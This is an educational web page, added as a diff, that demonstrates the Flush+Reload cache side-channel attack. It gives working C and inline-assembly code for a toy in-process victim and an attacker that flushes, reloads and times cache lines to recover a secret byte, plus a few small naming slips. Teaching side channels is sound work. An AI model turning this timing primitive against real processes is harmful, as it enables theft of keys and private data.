@@ -1,0 +1,165 @@
+<!--Add date: 08/12/2020-->
+
+<h1>Flush + Reload</h1>
+
+<h2>Attack Demonstration</h2>
+
+<h3>Demo by YR81</h3>
+
+<p>This demonstration shows the operation of Flush + Reload, a cache attack whereby an attacker can learn about what memory locations a victim has accessed. Such a vulnerability is especially dangerous if memory accesses can be correlated with a secret value such as a cryptographic key. The <a href = "https://eprint.iacr.org/2013/448.pdf" target = "_blank">original paper</a> describes the general details of the attack and provides an example where the private key from GnuPG can be extracted. However, this attack mechanism has far greater impact - indeed, it is the read primitive in the well-known <a href = "https://spectreattack.com/spectre.pdf" target = "_blank">Spectre</a> attacks disclosed in 2017.</p>
+
+<p>The operational basis behind Flush + Reload is as follows. When the processor needs to get a value from memory, it first checks to see if the value is saved in caches. On most modern Intel CPUs, there are three cache "levels": L1, L2, and L3, in order of increasing size and increasing access time. It is known as a "cache hit" if the value is successfully found in the cache; otherwise, the CPU must recover from the "cache miss" by moving on to the next level of cache, or, if all caches are exhausted, to main memory to retrieve the requested value. Cache misses are costly and should be avoided for fast execution. For this reason, when the CPU has to go all the way to main memory, it will populate the caches with the value.</p>
+
+<p>Suppose an attacker can selectively load arbitrary values from memory. By first initializing the cache by flushing it, letting the victim process run, then <i>probe</i> the cache by selecting values in memory to read and timing those reads, the attacker can determine with relatively good accuracy which values in memory the victim has read from. Let's demonstrate this behavior.</p>
+
+<p>We begin by creating a victim "process". The victim process simply chooses a random value between 0..255 inclusive and reads a buffer at those indices. These random values are meant to be secret, but we will leak them using Flush + Reload. The buffer is an array of pointers, each pointing to a 512-byte block of memory. For each selected pointer, the buffer will read one byte from that location. The choice of block size is system-dependent. I chose 512 because it is 8 times the line size of the data caches in my CPU (see the CPU-Z output in Figure 1). If we use a smaller value, we may not be able to distinguish between accesses to different indices in the pointer array, since they would be cached along with a line miss.</p>
+
+<img src = "./images/flush_reload_1.png" class = "small" />
+
+<p class = "caption">Figure 1. Cache specifications for an Intel Kaby Lake (i7) CPU.</p>
+
+<p>The attacker process begins by flushing the cache. Then, it will call the victim process, which loads the random block into cache. Following this, the attacker probes the memory by reading one byte from each of the 256 pointers. The attacker times how long each of these reads takes and returns an array of these times. We should expect to see one value for which the time is quite low compared to the others since they are already in the cache and did not need to be retrieved from main memory. Note that at the end of each probe operation, we should clear the probed address from caches to restore the state of caches before the probe.</p>
+
+<p>The code for the victim process is pretty straightforward:</p>
+
+<pre class = "c">
+void victim() {
+        unsigned int out;
+        if (!initted) {
+                asm __volatile__ (
+                        "rdtsc\n"
+                        "and rax, 0xff\n"
+                        : "=a" (out)
+                        : /* no inputs */
+                        : /* no clobbers */
+                );
+
+                printf("Victim initialized. Secret byte: 0x%02x\n", out);
+                initted = 1;
+        }
+
+        asm __volatile__ (
+                "mov rsi, qword ptr [rbx + 8 * rax]\n"
+                "lodsb\n"
+                : /* no outputs */
+                : "b" (ptrs), "a" (out)
+                : "rsi"
+        );
+
+        return;
+}
+</pre>
+
+<p>The first time that <code>victim()</code> is called, it will generate a secret byte value, which is what we seek to leak. The purpose of the <code>rtdsc</code> instruction is to generate that random byte (not completely random of course, but good enough for our purposes). After the secret is initialized, subsequent calls to <code>victim()</code> will simply read one byte from the respective pointer. The secret (<code>out</code>) is printed for demonstration purposes, but note that as a local variable in <code>victim()</code>'s frame, it is essentially unseen by other procedures.</p>
+
+<p>The <code>attacker()</code> procedure is as follows:</p>
+
+<pre class = "c">
+void attacker() {
+        unsigned int i; unsigned int j; unsigned int ii;
+        unsigned int t;
+
+        for (j = 1; j <= 1000; j++) {
+                // here is the FLUSH part of the attack
+                for (i = 0; i < 256 + EXTRA; i++) {
+                        asm __volatile__ (
+                                "clflush byte ptr [rbx]\n"
+                                : /* no outputs */
+                                : "b" (ptrs[i])
+                                : /* no clobbers */
+                        );
+
+                }
+
+                // run the victim
+                victim();
+
+                // now, RELOAD and time
+                for (i = 0; i < 256 + EXTRA; i++) {
+//                      printf("Reading from 0x%p\n", ptrs[i]);
+                        asm __volatile__ (
+                                "mfence\n"
+                                "rdtsc\n"
+                                "mov rcx, rax\n"
+                                "lodsb\n"
+                                "lfence\n"      //ensure load happens
+                                "rdtsc\n"       //before re-reading counter
+                                "sub rax, rcx\n"
+                                "clflush byte ptr [rsi - 1]\n"  //restore cache
+                                : "=a" (t)
+                                : "S" (ptrs[i])
+                                : "rcx", "rdx"
+                        );
+
+                        times[i] += ((double) t - times[i]) / (double) j;
+                        sched_yield();
+                }
+
+        }
+
+        return;
+}
+</pre>
+
+<p>Let's break down each part of the attacker. First, we flush all pointers that could be accessed from the cache. This is the "FLUSH" part of the attack. After clearing out the cache, we run <code>victim()</code>. This will place one of the pointers in the cache that we will then leak. Finally, we RELOAD all of the pointers in the array and time how long it takes to read from each one. For the attack to work, it turns out that we actually have to read a couple blocks <i>beyond</i> the 256 x 512 memory range. The reason for this is unclear to me at present, but I suspect it may have to do with stride prediction - the CPU learns that we are only accessing only a single byte up to 256 x 512 so it chooses not to cache blocks higher than a certain value. Further experiments where we randomize the order of accesses may confirm or refute this possibility. In this example, I have chosen <code>EXTRA = 32</code>.</p>
+
+<p>The steps described above are run <code>1000</code> times, and the average time is recorded in the <code>times[]</code> array. Note how the average is computed "on-the-fly"; i.e., we do not require storing the values in an array and computing the mean later.</p>
+
+<p>Finally, the code to set up and run the experiment:</p>
+
+<pre class = "c">
+void main() {
+        unsigned int i; unsigned int found = 0;
+        void* primBuf = malloc((256 + EXTRA + 1) * BLOCK);
+        double meanAccessTime; double stdAccessTime;
+
+        // set up the pointer array
+        for (i = 0; i < 256 + EXTRA; i++) {
+                ptrs[i] = (void*) (((long) primBuf + BLOCK * i + BLOCK - 1) & ~(BLOCK - 1));
+        }
+
+        attacker();
+        printf("Access times:\n");
+        for (i = 0; i < 256; i++) {
+                printf("%0.0f, ", times[i]);
+                if (i % 16 == 15) printf("\n");
+        }
+
+        // see if we can find a good guess
+        meanAccessTime = mean(times, 256, A_LO, A_HI); stdAccessTime = ssd(times, 256, A_LO, A_HI);
+        printf("Perceived regular access times: > %0.2f\n", meanAccessTime - LOWLIM * stdAccessTime);
+        for (i = 0; i < 256; i++) {
+                if (times[i] < meanAccessTime - LOWLIM * stdAccessTime) {
+                        printf("Guess byte: 0x%02x (Access time: %0.2f)\n", i, times[i]);
+                        found++;
+                }
+
+        }
+
+        if (!found) {
+                printf("Unable to discern a byte based on deviation metric.\n");
+        }
+
+        if (found > 1) {
+                printf("Found multiple possibilities. Best guess is probably smaller one.\n");
+        }
+
+        return;
+}
+</pre>
+
+<p>First, we create the buffer where our pointers will be stored. The thing is, we would like our blocks to be aligned to 512-byte boundaries. We cannot simply call <code>malloc(512)</code> 256 times and expect to get aligned blocks. So instead, we request a very large chunk of memory and manually align and assign the blocks using a little bit manipulation. We then call <code>attacker()</code>, which will populate the times array after initializing the victim. Finally, we run some statistics on the results. In our case, the "secret" location that <code>victim()</code> chooses will have an access time of much less than the others.</p>
+
+<img src = "./images/flush_reload_2.png" />
+
+<p class = "caption">Figure 2. Output of proof-of-concept code.</p>
+
+<p>As shown in <b>Figure 2</b>, there is a huge disparity between the access time for byte <code>0x8c</code> and for all other bytes. We can plot the times on a histogram for visualization.</p>
+
+<img src = "./images/flush_reload_3.png" />
+
+<p class = "caption">Figure 3. Distribution of memory access times, showing a clear difference between one byte and all of the others.</p>
+
+<p>This works no matter what byte is selected and has a very high accuracy rate. So, clearly, we have a read primitive based on targeted memory accesses.</p>
+
+<p>There are related side-channel attacks besides Reload+Flush that operate based on similar principles. For instance, Evict+Flush also presents a memory leakage vulnerability, but instead of explicitly FLUSHing the cache (via <code>clflush</code> or similar instructions), the item of interest is evicted from the cache by accessing other locations in memory. This dangerous class of side-channel attacks can be used to leak cryptographic secrets and personal information, and it has still not been addressed in hardware design to the present day.</p>
